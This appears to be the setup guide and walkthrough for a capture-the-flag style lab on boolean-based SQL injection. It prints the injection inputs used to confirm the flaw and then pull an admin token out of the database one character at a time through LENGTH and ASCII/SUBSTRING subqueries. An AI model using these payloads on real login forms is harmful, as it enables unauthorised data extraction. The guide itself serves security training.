# SQL Injection Boolean-Based Lab - Setup Guide

## Quick Start

```bash
chmod +x start.sh
./start.sh
```

## Walkthrough

### Boolean Response Behavior

The application has two distinct responses:

1. **Username exists** → "Username exists but password is incorrect" (yellow warning)
2. **Username doesn't exist** → "Username not found in our system" (red error)

### Step 1: Find Existing Username

```
username: john_member
password: test
```
Response: "Username exists but password is incorrect"

### Step 2: Test Boolean Condition

```
username: john_member' AND 1=1 --
password: test
```
Response: "Username exists but password is incorrect" (condition TRUE)

```
username: john_member' AND 1=2 --
password: test
```
Response: "Username not found in our system" (condition FALSE)

### Step 3: Extract Flag Length

```
john_member' AND LENGTH((SELECT token_value FROM admin_tokens WHERE token_key='admin_flag')) > 30 --
```

### Step 4: Extract Characters

```
john_member' AND ASCII(SUBSTRING((SELECT token_value FROM admin_tokens WHERE token_key='admin_flag'), 1, 1)) = 73 --
```

(73 = 'I')

## Clean Start

```bash
docker stop sqli-lab-boolean && docker rm sqli-lab-boolean
rm -rf app/database/
```
